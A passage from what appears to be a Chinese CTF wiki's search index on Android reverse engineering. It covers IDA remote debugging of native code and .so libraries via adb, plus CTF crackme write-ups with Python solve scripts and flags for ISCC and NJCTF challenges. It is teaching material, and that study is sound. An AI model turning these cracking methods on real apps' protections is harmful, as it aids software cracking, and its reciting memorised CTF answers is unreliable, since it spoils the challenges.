\u7528\u6765\u6807\u8bc6\u8be5\u8fdb\u7a0b\u662f\u88ab\u54ea\u4e2a\u8fdb\u7a0b ptrace \u4e86\u3002\u5982\u679c\u6ca1\u6709\u88ab\u5176\u4ed6\u8fdb\u7a0b ptrace\uff0c\u90a3\u4e48\u5c31\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de\u5bf9\u5e94\u8fdb\u7a0b\u7684 pid\u3002","title":"\u57fa\u672c\u539f\u7406"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_3","text":"\u65e0\u8bba\u662f\u8c03\u8bd5\u4ec0\u4e48\u539f\u751f\u5c42\u7a0b\u5e8f\uff0c\u57fa\u672c\u7684\u73af\u5883\u642d\u5efa\u90fd\u662f\u7c7b\u4f3c\u7684\uff0c\u9700\u8981\u786e\u4fdd IDA \u4e0e\u624b\u673a\u901a\u4fe1\u6b63\u5e38\u3002 \u4e0a\u4f20 android_server \u6587\u4ef6(\u5728 ida \u7684 dbgsrv \u6587\u4ef6\u5939\u4e0b)\uff0c\u5e76\u4fee\u6539\u76f8\u5e94\u6743\u9650\u4f7f\u5176\u53ef\u4ee5\u6267\u884c adb push android_server /data/local/tmp/ adb shell chmod 755 /data/local/tmp/android_server \u5f00\u542f android_server\uff0c\u5176\u4f1a\u76d1\u542c 23946 \u7aef\u53e3(\u4ee5 root \u6743\u9650\u8fd0\u884c) adb shell # \u8fdb\u5165adb su # \u5207\u6362root ./data/local/tmp/android_server #\u542f\u52a8android_server 3. \u5efa\u7acb\u672c\u5730\u8ba1\u7b97\u673a 23496 \u7aef\u53e3\u4e0e\u624b\u673a\u7aef\u53e3 23946 \u7684\u901a\u4fe1\u3002\u5f53 PC \u6709\u5ba2\u6237\u7aef\u8fde\u63a5 23946 \u7aef\u53e3\u65f6\uff0c\u5176\u53d1\u9001\u7684\u4fe1\u606f\u90fd\u5c06\u88ab\u8f6c\u53d1\u5230\u624b\u673a\u7684\u76f8\u5e94\u7684\u7aef\u53e3\uff0c\u8fd9\u65f6 android_server \u5c31\u6536\u5230\u76f8\u5e94\u7684\u6570\u636e\uff0c\u4ece\u800c\u4f7f\u5f97 IDA \u53ef\u4ee5\u8c03\u8bd5\u7a0b\u5e8f\u3002\u524d\u9762\u7684 tcp \u7684\u7aef\u53e3\u6307\u7684\u662f\u672c\u5730 PC \u7684\u7aef\u53e3\uff0c\u540e\u9762\u7684\u6307\u7684\u662f\u624b\u673a\u7684\u7aef\u53e3\u3002 adb forward tcp:23946 tcp:23946 \u6ce8\u610f\uff1a \u5176\u5b9e\u8fd9\u4e2a\u8fde\u63a5\u5efa\u7acb\u7684\u662f adb server \u4e0e\u4e0e\u624b\u673a\u4e0a adbd \u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u6240\u4ee5\u5176\u901a\u4fe1\u5927\u6982\u662f\u8fd9\u4e2a\u6837\u5b50\u7684 IDA\u2194adb server<--->adbd<---->android_server \u200b \u7535\u8111 | \u624b\u673a \u5176\u4e2d\uff0c\u7b2c\u4e00\u6b65\u53ea\u9700\u8981\u6267\u884c\u4e00\u6b21\uff0c\u540e\u9762\u5c31\u4e0d\u9700\u8981\u518d\u6b21\u6267\u884c\u3002\u800c\u7b2c 2-3 \u6b65\u6bcf\u6b21\u90fd\u5f97\u6267\u884c\uff0c\u56e0\u6b64\u53ef\u4ee5\u5199\u6210\u4e00\u4e2a\u811a\u672c\uff0c\u5e76\u5c06\u811a\u672c\u7684\u8def\u5f84\u653e\u5728\u7cfb\u7edf\u7684 path \u73af\u5883\u53d8\u91cf\u4e0b\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u6267\u884c\u4e00\u4e2a\u547d\u4ee4\u76f4\u63a5\u6267\u884c\u3002","title":"\u57fa\u672c\u73af\u5883\u642d\u5efa"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#-1","text":"\u57fa\u672c\u539f\u751f\u7a0b\u5e8f\u6307\u7684\u662f\u666e\u901a\u7684\u7f16\u8bd1\u4e3a arm \u6c47\u7f16\u7684 c/c++ \u7a0b\u5e8f\u3002","title":"\u57fa\u672c\u539f\u751f\u7a0b\u5e8f\u8c03\u8bd5-\u6cd51"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_4","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 http://www.52pojie.cn/thread-554068-1-1.html \u4e2d\u7684 debugnativeapp \u4e3a\u4f8b\u5b50\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u628a\u539f\u751f\u7a0b\u5e8f\u653e\u5230 android \u8bbe\u5907\u4e2d\uff0c\u5e76\u4fee\u6539\u5176\u6743\u9650\uff0c\u4f7f\u5176\u53ef\u4ee5\u88ab\u6267\u884c\u3002\u5982\u4e0b adb push debugnativeapp /data/local/tmp/ adb shell chmod 755 /data/local/tmp/debugnativeapp","title":"\u6dfb\u52a0\u7a0b\u5e8f"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_5","text":"\u6839\u636e\u539f\u751f\u5c42\u7a0b\u5e8f\u7684\u4f4d\u6570\u9009\u62e9\u76f8\u5e94\u7684 ida\uff0c\u7136\u540e\u9009\u62e9 Debugger-Run-RemoteArmLinux/Android debugger\uff0c\u5982\u4e0b\u754c\u9762 \u5176\u4e2d\uff0c\u91cd\u8981\u7684\u53c2\u6570\u610f\u4e49\u5982\u4e0b Application \u88ab\u8c03\u8bd5\u7a0b\u5e8f\u5728\u624b\u673a\u4e0a\u7684\u7edd\u5bf9\u8def\u5f84\u3002 Directory \u88ab\u8c03\u8bd5\u7a0b\u5e8f\u5728\u624b\u673a\u4e2d\u7684\u76ee\u5f55 Hostname \u5373\u6211\u4eec\u4e0e\u54ea\u4e2a\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\uff0c\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u548c\u672c\u5730PC\u8fdb\u884c\u901a\u4fe1\u3002 \u5176\u4e2d Debug options \u9009\u62e9\u5982\u4e0b \u4e3b\u8981\u662f\u9009\u62e9\u4e86\u4e09\u4e2a Events\uff0c\u4f7f\u5f97\u6211\u4eec\u7684\u7a0b\u5e8f\u53ef\u4ee5\u5728\u5165\u53e3\u70b9\uff0c\u7ebf\u7a0b\u542f\u52a8\u65f6\uff0clibrary\u52a0\u8f7d\u65f6\u81ea\u52a8\u505c\u6b62\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u90fd\u8fdb\u884c\u9009\u62e9\u3002 \u542f\u52a8\u7a0b\u5e8f\u540e\uff0c\u5982\u4e0b \u6ce8\uff1a \u5982\u679c\u53d1\u73b0can not load plugin \uff0c\u90a3\u53ef\u80fd\u662f\u624b\u673a\u6ca1\u6709root\u3002 \u5982\u679c\u9047\u5230\u4ee5\u4e0b\u95ee\u9898\uff0c\u76f4\u63a5cancel\u5c31\u597d\u3002\u5177\u4f53\u539f\u56e0\u8fd8\u4e0d\u6e05\u695a\u3002 \u5982\u679c\u9047\u5230error: only position independent executables (PIE) are supported.\u4e00\u822c\u662f\u56e0\u4e3aandroid\u624b\u673a\u7684\u7248\u672c\u5927\u4e8e5\uff0c\u53ef\u4ee5\u5c1d\u8bd5 \u4f7f\u7528android_server\u7684PIE\u7248\u672c \u5229\u7528010Editor\u5c06\u53ef\u6267\u884cELF\u6587\u4ef6\u7684header\u4e2d\u7684elf header\u5b57\u6bb5\u4e2d\u7684e_type\u6539\u4e3aET_DYN(3)\u3002","title":"\u542f\u52a8\u8c03\u8bd5"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#so","text":"\u5bf9\u4e8e so \u539f\u751f\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u60f3\u8fd9\u548c\u666e\u901a\u539f\u751f\u7a0b\u5e8f\u6709\u4ec0\u4e48\u4e0d\u4e00\u6837\u7684\u5730\u65b9\u5462\uff1f\u81ea\u7136\u662f\u6709\u7684\uff0cso\u6587\u4ef6\u4e0d\u80fd\u5355\u72ec\u8fd0\u884c\u3002\u4e00\u822c\u662f\u5176\u5b83\u7a0b\u5e8f\u8c03\u7528 so \u6587\u4ef6\u4e2d\u7684\u57fa\u672c\u67d0\u4e9b\u51fd\u6570\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u80fd\u76f4\u63a5\u91c7\u7528\u4e0a\u9762 run \u7684\u65b9\u5f0f\u4e86\u3002\u4e00\u822c\u6765\u8bf4\uff0candroid \u4e2d so \u6587\u4ef6\u90fd\u662f\u4f9d\u8d56\u4e8e apk \u6587\u4ef6\u7684\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5 http://www.52pojie.cn/thread-554068-1-1.html \u4e2d\u7684 debugjniso.apk \u4e3a\u4f8b\u5b50\u3002 \u9996\u5148\uff0c\u5fc5\u987b\u642d\u5efa\u57fa\u672c\u8c03\u8bd5\u73af\u5883\u3002","title":"so\u539f\u751f\u7a0b\u5e8f\u8c03\u8bd5"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_6","text":"\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5c06 apk \u5b89\u88c5\u5230\u624b\u673a\u4e0a\u3002 adb install debugjniso.apk","title":"\u5b89\u88c5\u7a0b\u5e8f"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#app","text":"\u5176\u6b21\uff0c\u6211\u4eec\u9700\u8981\u4ee5 \u8c03\u8bd5\u6a21\u5f0f\u542f\u52a8\u7a0b\u5e8f \uff0c\u8fd9\u6837\uff0c\u624d\u53ef\u4ee5\u65b9\u4fbf IDA \u6765\u6355\u6349\u5230\u76f8\u5e94\u7684\u7a0b\u5e8f\u5e76\u5bf9\u5176\u8fdb\u884c attach\u3002 shell adb shell am start -D -n packagename/.MainActivity","title":"\u8c03\u8bd5\u6a21\u5f0f\u542f\u52a8app"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#attach","text":"\u542f\u52a8 IDA pro\uff0c\u70b9\u51fbDebugger-Attach-RemoteArmLinux/Android debugger\uff0cHostname \u586b localhost\uff0cport \u9ed8\u8ba4\u5c31\u662f 23946 \u7aef\u53e3\u3002\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u672c\u5730\u7535\u8111\u7684\u76d1\u542c\u7aef\u53e3\u3002\u5982\u4e0b \u70b9\u51fb ok\uff0c\u542f\u52a8\u8c03\u8bd5 \u6ce8\u610f\uff1a \u5982\u679c\u6700\u540e\u51fa\u73b0\u53ea\u6709\u4e00\u4e2a\u7a0b\u5e8f /bin/sh \u53ef\u4ee5\u88ab attach\uff0c\u90a3\u8bf4\u660e\u6ca1\u6709\u4ee5 root \u6743\u9650\u8fd0\u884c android_server \u7a0b\u5e8f\u3002 \u5229\u7528 ctrl+f \u5feb\u901f\u5b9a\u4f4d\u5e76\u9009\u62e9\u76f8\u5e94\u7684\u8fdb\u7a0b\uff0c\u5982\u4e0b \u7136\u540eok\u786e\u5b9a\u5373\u53ef\u3002 \u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u5df2\u7ecf attach \u6210\u529f\u4e86\u3002 \u8fd9\u65f6\u5019\u6211\u4eec\u518d\u70b9\u51fb Debugger-Debugger options\uff0c\u8bbe\u7f6e\u76f8\u5173\u9009\u9879\u5982\u4e0b \u610f\u601d\u7c7b\u540c\u4e8e\u539f\u751f\u7a0b\u5e8f\u3002 \u4e3a\u4ec0\u4e48\u8fd9\u65f6\u5019\u624d\u9009\u62e9\u8981\u8bbe\u4e0b\u76f8\u5e94\u7684\u65ad\u70b9\uff0c\u662f\u56e0\u4e3a\u5982\u679c\u5728\u5f00\u59cbattach\u7684\u65f6\u5019\u5c31\u8bbe\u7f6e\u7684\u8bdd\uff0c\u5230\u8fd9\u91cc\u5176\u5b9e\u662f\u6ca1\u6709\u7684\u3002\u5927\u5bb6\u53ef\u4ee5\u8bd5\u8bd5\u3002","title":"attach\u7a0b\u5e8f"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#app_1","text":"\u8fd9\u65f6\u5019\uff0capp \u7684\u754c\u9762\u662f wait for debugger\uff0c\u6211\u4eec\u4e5f\u5df2\u7ecf attach \u4e0a\u53bb\u4e86\u3002\u8fd9\u65f6\u5019\uff0c\u5c31\u9700\u8981\u8ba9\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\u4e86\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6253\u5f00 ddms \u6765\u9009\u4e2d\u6211\u4eec\u8981\u8c03\u8bd5\u7684\u8fdb\u7a0b\u3002 \u8fd9\u91cc\u5176\u5b9e\u76f8\u5f53\u4e8e\u76f4\u63a5\u6267\u884c\u4e86 # \u663e\u793a\u624b\u673a\u6240\u6709\u53ef\u4f9b\u8c03\u8bd5\u7684\u7528\u6237\u8fdb\u7a0b adb jdwp # \u5728PC\u7684xxx\u7aef\u53e3\u4e0e\u624b\u673a\u7684\u76f8\u5e94\u7aef\u53e3\u4e4b\u95f4\u5efa\u7acb\u8fde\u63a5\uff0c\u65b9\u4fbf\u901a\u4fe1 adb forward tcp:xxx jdwp:<pid> \u4e4b\u6240\u4ee5\u4e0d\u4f7f\u7528\u547d\u4ee4\u53bb\u6267\u884c\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u8fd8\u5f97\u81ea\u5df1\u53bb\u786e\u5b9a\u6211\u4eec\u7684 apk \u7684\u8fdb\u7a0b\u53f7\uff0c\u8fd9\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u57fa\u672c\u7684\u901a\u4fe1\u8fc7\u7a0b \u6b64\u65f6\uff0c\u6211\u4eec\u7684\u7535\u8111\u5df2\u7ecf\u4e0e\u624b\u673a\u7684 app \u865a\u62df\u673a\u4e4b\u95f4\u5efa\u7acb\u4e86\u901a\u4fe1\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 jdb \u5728 java \u5c42\u6765\u5c06\u6211\u4eec\u7684 apk \u5e94\u7528 attach \u5230\u6211\u4eec\u7684\u7535\u8111\u4e0a\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u7684\u547d\u4ee4\u3002 jdb -connect com.sun.jdi.SocketAttach:hostname = localhost,port = xxx \u5176\u4e2d xxx \u5c31\u662f\u6211\u4eec\u5728 ddms \u770b\u5230\u7684 8700 \u7aef\u53e3\uff0c\u4e00\u822c\u9ed8\u8ba4\u5c31\u662f\u8fd9\u4e2a\u3002\u6267\u884c\u4e4b\u540e C: \\U sers \\i romise \u03bb jdb.bat jdb -connect com.sun.jdi.SocketAttach:hostname = 127 .0.0.1,port = 8700 \u8bbe\u7f6e\u672a\u6355\u83b7\u7684java.lang.Throwable \u8bbe\u7f6e\u5ef6\u8fdf\u7684\u672a\u6355\u83b7\u7684java.lang.Throwable \u6b63\u5728\u521d\u59cb\u5316jdb... > \u6211\u4eec\u518d\u6b21\u770b\u4e00\u4e0b\u6211\u4eec\u7684\u624b\u673a\uff0c \u6b64\u65f6\uff0c\u5e94\u7528\u5df2\u7ecf\u53c8\u7ee7\u7eed\u8fd0\u884c\u4e86\uff0c\u4e0d\u518d\u662f\u4e4b\u524d\u7684 wait for debugger \u4e86\u3002","title":"\u6062\u590d app \u6267\u884c"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_7","text":"\u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u6253\u5f00\u4e00\u4e2a ida\uff0c\u5bfc\u5165\u8be5 apk \u7684 so \u5e93\uff0c\u7136\u540e\u5728 export \u4e2d\u5bfb\u627e\u6211\u4eec\u7684\u51fd\u6570\uff0c\u5982\u4e0b \u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a 0xc38\u3002 \u6211\u4eec\u518d\u5728\u4e4b\u524d\u7684\u8c03\u8bd5\u7684 IDA \u4e2d\u8fd0\u884c F9 \u76f4\u5230\u600e\u4e48\u6309\u90fd\u4e0d\u518d\u8fd0\u884c\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u7a0b\u5e8f\u65ad\u5728 linker \u5904 \u6b64\u65f6\uff0c\u6211\u4eec \u70b9\u51fb app \u754c\u9762\u7684\u8bbe\u7f6e\u6807\u9898\u6309\u94ae \uff08\u4e4b\u6240\u4ee5\u8981\u6309\u8fd9\u4e2a\uff0c\u662f\u56e0\u4e3a\u5728\u8be5\u51fd\u6570\u4e2d\u8c03\u7528\u4e86\u539f\u751f API\uff09\uff0c\u518d\u6b21\u89c2\u5bdfIDA\uff0c\u53ef\u4ee5\u770b\u51fa\u8be5 so \u5e93\u5df2\u7ecf\u88ab\u52a0\u8f7d\u8fdb\u5165 B3B05000: loaded /data/app/com.droider.debugjniso-1/oat/arm/base.odex B39B9000: loaded /system/lib/hw/gralloc.msm8974.so B39B2000: loaded /system/lib/libmemalloc.so B39AA000: loaded /system/lib/libqdutils.so B3B00000: loaded /data/app/com.droider.debugjniso-1/lib/arm/libdebugjniso.so \u8fd9\u65f6\uff0c\u6211\u4eec\u5229\u7528 ctrl+s \u5b9a\u4f4d\u5230\u8be5\u5e93\u7684\u8d77\u59cb\u5730\u5740\u5904 0xB3B00000\u3002\u7136\u540e\u6839\u636e \u7edd\u5bf9\u5730\u5740=\u57fa\u5730\u5740+\u76f8\u5bf9\u504f\u79fb \u5f97\u5230 jnistring \u7684\u5730\u5740\u3002","title":"\u786e\u5b9a\u539f\u751f\u51fd\u6570\u5730\u5740"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_8","text":"\u6309\u4e0b g\uff0c\u7136\u540e\u8f93\u5165 +0xC38 \uff0c\u70b9\u51fb ok \u5373\u53ef\u8df3\u8f6c\u81f3\u8be5\u51fd\u6570 libdebugjniso.so:B3B00C38 Java_com_droider_debugjniso_TestJniMethods_jniString libdebugjniso.so:B3B00C38 LDR R1, =(unk_B3B02148 - 0xB3B00C4C) libdebugjniso.so:B3B00C3C STMFD SP!, {R4,LR} libdebugjniso.so:B3B00C40 LDR R3, [R0] libdebugjniso.so:B3B00C44 ADD R1, PC, R1 ; unk_B3B02148 libdebugjniso.so:B3B00C48 MOV LR, PC \u6211\u4eec\u5728\u6b64\u51fd\u6570\u7684\u5f00\u59cb\u5904 F2 \u4e0b\u65ad\u70b9\uff0c\u7136\u540e\u518d\u6b21F9\u6267\u884c\u7a0b\u5e8f\uff0c\u540c\u65f6\u89c2\u770b\u624b\u673a\uff0c\u5c31\u53ef\u4ee5\u53d1\u73b0app\u7684\u6807\u9898\u53d8\u6210\u4e86 \u4f60\u597d\uff01Nativemethod \u3002 \u5230\u6b64\uff0cso \u539f\u751f\u7a0b\u5e8f\u7684\u57fa\u672c\u8c03\u8bd5\u6b65\u9aa4\u5c31\u7ed3\u675f\u4e86\u3002 \u6ce8\uff1a \u5982\u679c\u4e2d\u95f4\u51fa\u73b0\u4e86add map\u7684\u5bf9\u8bdd\u6846\u76f4\u63a5\u70b9\u51fbCancel\uff0c\u7136\u540eapply\u5373\u53ef\u3002","title":"\u89c2\u5bdf\u7ed3\u679c"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_9","text":"\u5f53\u4f7f\u7528\u6a21\u62df\u5668\u8c03\u8bd5 apk \u51fa\u73b0\u5f02\u5e38\u65f6\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u5e94\u7528\u68c0\u6d4b\u4e86\u662f\u5426\u8fd0\u884c\u5728\u6a21\u62df\u5668\u73af\u5883\u4e0b\uff0c\u8003\u8651\u4f7f\u7528\u624b\u673a\u3002 \u5f53\u4f7f\u7528\u771f\u673a\u8c03\u8bd5 apk \u65f6\uff0c\u4e5f\u6709\u53ef\u80fd\u4f1a\u9047\u5230\u5f02\u5e38\uff0c\u5361\u5728\u67d0\u4e00\u6761\u6307\u4ee4\u4e0a\uff0c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u6267\u884c\u8fd9\u6761\u6307\u4ee4\uff0c\u7136\u540e\u5c06 PC \u8bbe\u7f6e\u4e3a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u3002","title":"\u6ce8\u610f\u4e8b\u9879"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#-2","text":"\u5f85\u8865\u5145\u3002","title":"\u57fa\u672c\u539f\u751f\u7a0b\u5e8f\u8c03\u8bd5-\u6cd52"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_10","text":"","title":"\u591a\u7ebf\u7a0b\u8c03\u8bd5"},{"location":"android/basic_reverse/dynamic/ida_native_debug/#_11","text":"http://www.52pojie.cn/thread-554068-1-1.html https://www.kanxue.com/chm.htm?id=10296&pid=node1000944","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"android/basic_reverse/dynamic/ida_smali_debug/","text":"IDA \u52a8\u6001\u8c03\u8bd5 smali \u4ee3\u7801 \u00b6","title":"IDA \u52a8\u6001\u8c03\u8bd5 smali \u4ee3\u7801"},{"location":"android/basic_reverse/dynamic/ida_smali_debug/#ida-smali","text":"","title":"IDA \u52a8\u6001\u8c03\u8bd5 smali \u4ee3\u7801"},{"location":"android/basic_reverse/static/complex-example/","text":"\u9759\u6001\u5206\u6790\u7efc\u5408\u9898\u76ee \u00b6 2017 ISCC Crackone \u00b6 \u5229\u7528 jadx \u8fdb\u884c\u53cd\u7f16\u8bd1\uff0c\u53ef\u4ee5\u5f97\u5230\u7a0b\u5e8f\u7684\u57fa\u672c\u903b\u8f91\u5982\u4e0b \u5bf9\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\u8fdb\u884c base64 \u7f16\u7801\uff0c\u7136\u540e\u5728\u6307\u5b9a\u957f\u5ea6\u4f4d\u7f6e\u5904\u63d2\u5165 \\r\\n \uff0c\u8fd9\u4e2a\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u4e71\u7528\u3002 \u4e4b\u540e\u7a0b\u5e8f\u5c06\u7f16\u7801\u540e\u7684\u5185\u5bb9\u4f20\u9012\u7ed9 so \u4e2d\u7684 check \u51fd\u6570\u3002\u8fd9\u4e2a\u51fd\u6570\u7684\u903b\u8f91\u5982\u4e0b env = a1 ; len = plen ; str = pstr ; v7 = malloc ( plen ); (( * env ) -> GetByteArrayRegion )( env , str , 0 , len , v7 ); v8 = malloc ( len + 1 ); memset ( v8 , 0 , len + 1 ); memcpy ( v8 , v7 , len ); v9 = 0 ; for ( i = 0 ; ; ++ i ) { -- v9 ; if ( i >= len / 2 ) break ; v11 = v8 [ i ] - 5 ; v8 [ i ] = v8 [ len + v9 ]; v8 [ len + v9 ] = v11 ; } v8 [ len ] = 0 ; v12 = strcmp ( v8 , \"=0HWYl1SE5UQWFfN?I+PEo.UcshU\" ); free ( v8 ); free ( v7 ); return v12 <= 0 ; \u4e0d\u96be\u770b\u51fa\uff0c\u7a0b\u5e8f\u5c31\u662f\u76f4\u63a5\u5c06 base64 \u4e4b\u540e\u7684\u5b57\u7b26\u4e32\u7684\u4e24\u534a\u5206\u522b\u8fdb\u884c\u9002\u5f53\u7684\u64cd\u4f5c\uff0c\u8fd9\u91cc\u6211\u4eec\u5f88\u5bb9\u6613\u5199\u51fa python \u5bf9\u5e94\u7684\u6062\u590d\u4ee3\u7801\uff0c\u5982\u4e0b import base64 def solve (): ans = '=0HWYl1SE5UQWFfN?I+PEo.UcshU' length = len ( ans ) flag = [ 0 ] * length beg = 0 end = length while beg < length / 2 : end -= 1 flag [ beg ] = chr ( ord ( ans [ end ]) + 5 ) flag [ end ] = ans [ beg ] beg += 1 flag = '' . join ( flag ) print base64 . b64decode ( flag ) if __name__ == \"__main__\" : solve () \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b \u279c 2017ISCC python exp.py flag { ISCCJAVANDKYXX } 2017 NJCTF easycrack \u00b6 \u901a\u8fc7\u7b80\u5355\u9006\u5411\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u7684\u57fa\u672c\u903b\u8f91\u5982\u4e0b \u76d1\u63a7\u754c\u9762\u6587\u672c\u6846\uff0c\u5982\u679c\u6587\u672c\u6846\u5185\u5bb9\u6539\u53d8\u5219\u8c03\u7528 native parseText \u51fd\u6570\u3002 parseText \u7684\u4e3b\u8981\u529f\u80fd\u5982\u4e0b \u9996\u5148\u8c03\u7528 java \u5c42\u7684\u51fd\u6570 messageMe \u83b7\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32 mestr\u3002\u8fd9\u4e2a\u51fd\u6570\u7684\u903b\u8f91\u57fa\u672c\u662f \u4f9d\u6b21\u5c06 packagename \u7684\u6700\u540e\u4e00\u4e2a . \u540e\u9762\u7684\u5b57\u7b26\u4e32\u7684\u6bcf\u4e00\u4e2a\u4e0e 51\u8fdb\u884c\u5f02\u6216\uff0c\u5c06\u7ed3\u679c\u62fc\u63a5\u8d77\u6765\u3002 \u7136\u540e\u4ee5 mestr \u957f\u5ea6\u4e3a\u5468\u671f\uff0c\u5c06\u4e24\u8005\u8fdb\u884c\u5f02\u6216\uff0c\u6838\u5fc3\u903b\u8f91 str[i + j] = mestr[j] ^ iinput[i + j]; \u7ee7\u800c\u4e0b\u9762\u4ee5 I_am_the_key \u4e3a\u5bc6\u94a5\uff0c\u4f7f\u7528 RC4 \u52a0\u5bc6\u5bf9\u8be5\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u4e0e\u6700\u540e\u7684 compare \u6bd4\u8f83\u3002\u8fd9\u91cc\u731c\u6d4b\u7684\u4f9d\u636e\u5982\u4e0b \u5728 init \u51fd\u6570\u4e2d\u6709 256 \u8fd9\u4e2a\u5173\u952e\u5b57\uff0c\u800c\u4e14\u57fa\u672c\u5c31\u662f RC4 \u5bc6\u94a5\u7684\u521d\u59cb\u5316\u8fc7\u7a0b\u3002 crypt \u51fd\u6570\u663e\u7136\u5c31\u662f\u4e00\u4e2a RC4 \u52a0\u5bc6\u51fd\u6570\uff0c\u660e\u663e\u5c31\u662f RC4 \u7684\u52a0\u5bc6\u903b\u8f91\u3002 \u89e3\u5bc6\u811a\u672c\u5982\u4e0b from Crypto.Cipher import ARC4 def messageme (): name = 'easycrack' init = 51 ans = \"\" for c in name : init = ord ( c ) ^ init ans += chr ( init ) return ans def decrypt ( cipher , key ): plain = \"\" for i in range ( 0 , len ( cipher ), len ( key )): tmp = cipher [ i : i + len ( key )] plain += '' . join ( chr ( ord ( tmp [ i ]) ^ ord ( key [ i ])) for i in range ( len ( tmp ))) return plain def main (): rc4 = ARC4 . new ( 'I_am_the_key' ) cipher = 'C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4' cipher = '' . join ( chr ( int ( cipher [ i : i + 2 ], 16 )) for i in range ( 0 , len ( cipher ), 2 )) middleplain = rc4 . decrypt ( cipher ) mestr = messageme () print decrypt ( middleplain , mestr ) if __name__ == '__main__' : main () \u7ed3\u679c\u5982\u4e0b \u279c 2017NJCTF-easycrack python exp.py It_s_a_easyCrack_for_beginners \u279c 2017NJCTF-easycrack 2018 \u5f3a\u7f51\u676f picture lock \u00b6 \u7b80\u5355\u5206\u6790\u4e4b\u540e\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u56fe\u7247\u52a0\u5bc6\u7a0b\u5e8f\uff1ajava \u5c42\u4e3a native \u5c42\u4f20\u5165 image/ \u4e0b\u7684\u7b2c\u4e00\u4e2a\u6587\u4ef6\u540d\uff0c\u4ee5\u53ca\u5e0c\u671b\u52a0\u5bc6\u540e\u7684\u56fe\u7247\u6587\u4ef6\u540d\uff0c\u5305\u62ec\u5bf9\u5e94\u7684 apk \u7684\u7b7e\u540d\u7684 md5\u3002 \u4e0b\u9762\u6211\u4eec\u5c31\u53ef\u4ee5\u5206\u6790 native \u5c42\u4ee3\u7801\uff0c\u7531\u4e8e\u7a0b\u5e8f\u5f88\u660e\u663e\u8bf4\u662f\u4e00\u4e2a\u52a0\u5bc6\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528IDA \u7684 findcrypto \u63d2\u4ef6\u6765\u8fdb\u884c\u8bc6\u522b\uff0c\u7ed3\u679c\u5374\u662f\u53d1\u73b0\u4e86 S \u76d2\uff0c\u800c\u4e14\u57fa\u672c\u4e0a\u5c31\u662f\u7b26\u5408 AES \u7684\u52a0\u5bc6\u6d41\u7a0b\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7a0b\u5e8f\u7684\u4e3b\u4f53\u662f\u4e00\u4e2a AES \u52a0\u5bc6\uff0c\u7ecf\u8fc7\u7ec6\u81f4\u5206\u6790\u53ef\u4ee5\u53d1\u73b0 native \u5c42\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b \u5c06\u4f20\u5165\u7684\u7b7e\u540d\u7684 md5 \u5b57\u7b26\u4e32\u5206\u4e3a\u4e24\u534a\uff0c\u751f\u6210\u4e24\u7ec4\u5bc6\u94a5\u3002 \u6bcf\u6b21\u8bfb\u5165md5sig[i%32]\u5927\u5c0f\u7684\u5185\u5bb9 \u6839\u636e\u8bfb\u5165\u7684\u5927\u5c0f\u51b3\u5b9a\u4f7f\u7528\u54ea\u4e00\u7ec4\u5bc6\u94a5 \u5947\u6570\u4f7f\u7528\u7b2c\u4e8c\u7ec4\u5bc6\u94a5 \u5076\u6570\u4f7f\u7528\u7b2c\u4e00\u7ec4\u5bc6\u94a5 \u5982\u679c\u8bfb\u5165\u7684\u5927\u5c0f\u4e0d\u591f 16 